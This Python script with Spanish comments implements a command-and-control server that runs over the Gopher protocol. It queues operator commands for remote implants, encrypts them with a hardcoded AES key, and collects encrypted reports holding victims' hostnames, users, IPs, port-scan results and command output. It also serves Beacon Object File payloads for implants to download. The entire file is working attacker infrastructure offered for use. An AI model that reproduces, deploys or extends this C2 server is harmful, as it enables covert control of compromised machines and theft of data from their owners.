#!/usr/bin/env python3
import socket
import threading
import base64
import json
import os
import logging
from datetime import datetime
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import csv

# === CONFIG ===
HOST = "0.0.0.0"
PORT = 7070  # o 70 si usas root
AES_KEY = bytes.fromhex("88a41baa358a779c346d3ea784bc03f50900141bb58435f4c50864c82ff624ff")
ALLOWED_DIR = "sessions/logs"
UPLOAD_DIR = "sessions/uploads"
os.makedirs(ALLOWED_DIR, exist_ok=True)
os.makedirs(UPLOAD_DIR, exist_ok=True)

# === Estado del C2 ===
commands = {}        # client_id -> comando
connected_clients = set()
results = {}

# === Cifrado ===
def encrypt_data(data: bytes) -> str:
    if len(data) == 0:
        data = b"\x00"          # 1 byte de padding
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(AES_KEY), modes.CFB(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted = encryptor.update(data) + encryptor.finalize()
    return base64.b64encode(iv + encrypted).decode()

def decrypt_data(b64_data: str) -> bytes:
    data = base64.b64decode(b64_data)
    iv, ciphertext = data[:16], data[16:]
    cipher = Cipher(algorithms.AES(AES_KEY), modes.CFB(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext) + decryptor.finalize()

# === Manejar conexión Gopher ===
def handle_client(conn, addr):
    try:
        selector = conn.recv(1024).decode('ascii', errors='ignore').strip()
        logging.info(f"Selector recibido de {addr}: {selector}")

        # Caso 1: GET de comando
        if selector.startswith("/pleasesubscribe/v1/users/"):
            client_id = selector.split("/")[-1]
            if not client_id:
                client_id = "unknown"
            connected_clients.add(client_id)
            
            # Eliminar el comando de la cola después de enviarlo
            cmd = commands.pop(client_id, "")  # Cambiar .get() por .pop()
            payload = encrypt_data(cmd.encode()) if cmd else encrypt_data(b"")
            
            # Enviar SOLO el payload sin formato Gopher
            response = f"{payload}\r\n"  # Sin el prefijo 'i' ni los campos de Gopher


        # Caso 2: POST de resultado → selector = "/report/<base64>"
        elif selector.startswith("/report/"):
            b64_payload = selector[len("/report/"):]
            try:
                decrypted = decrypt_data(b64_payload)
                data = json.loads(decrypted.decode())
                client_id = data.get("client", "unknown")
                connected_clients.add(client_id)

                # Guardar en CSV
                log_file = os.path.join(ALLOWED_DIR, f"{client_id}.log")
                file_exists = os.path.isfile(log_file)
                with open(log_file, "a", newline="") as f:
                    writer = csv.writer(f)
                    if not file_exists:
                        writer.writerow([
                            "client_id", "os", "pid", "hostname", "ips", "user",
                            "discovered_ips", "result_portscan", "result_pwd", "command", "output"
                        ])
                    writer.writerow([
                        client_id,
                        data.get("client", "")[:100],
                        str(data.get("pid", ""))[:20],
                        data.get("hostname", "")[:100],
                        data.get("ips", "")[:100],
                        data.get("user", "")[:50],
                        str(data.get("discovered_ips", ""))[:1000],
                        str(data.get("result_portscan", ""))[:1000],
                        data.get("result_pwd", "")[:1000],
                        data.get("command", "")[:500],
                        data.get("output", "")[:1000],
                    ])
                results[client_id] = data
                response = "OK\r\n" 
                logging.info(f"Resultado guardado para {client_id}")
            except Exception as e:
                logging.error(f"Error al procesar /report/: {e}")
                response = "ERROR\r\n"

        # Caso 3: Descarga de BOF
        elif selector.startswith("/bof/"):
            bof_name = selector[len("/bof/"):]
            bof_path = os.path.join(UPLOAD_DIR, bof_name)
            if os.path.isfile(bof_path):
                with open(bof_path, "rb") as f:
                    bof_data = f.read()
                b64_bof = base64.b64encode(bof_data).decode()
                response = f"{b64_bof}\r\n"
            else:
                response = "BOF_NOT_FOUND\r\n"


        else:
            response = "iUNKNOWN_SELECTOR\terror.host\t1\r\n.\r\n"

        conn.sendall(response.encode('ascii'))
    except Exception as e:
        logging.error(f"Error en handle_client: {e}")
    finally:
        conn.close()

# === Iniciar servidor ===
def main():
    logging.basicConfig(level=logging.INFO)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((HOST, PORT))
    sock.listen(5)
    logging.info(f"[*] C2 Gopher escuchando en gopher://0.0.0.0:{PORT}/")

    # Hilo para inyectar comandos manualmente (simula tu interfaz web)
    def command_injector():
        while True:
            try:
                client_id = input("Client ID: ").strip()
                cmd = input("Command: ").strip()
                if client_id and cmd:
                    commands[client_id] = cmd
                    print(f"[+] Comando '{cmd}' en cola para {client_id}")
            except (KeyboardInterrupt, EOFError):
                break
    threading.Thread(target=command_injector, daemon=True).start()

    while True:
        conn, addr = sock.accept()
        threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()

if __name__ == "__main__":
    main()
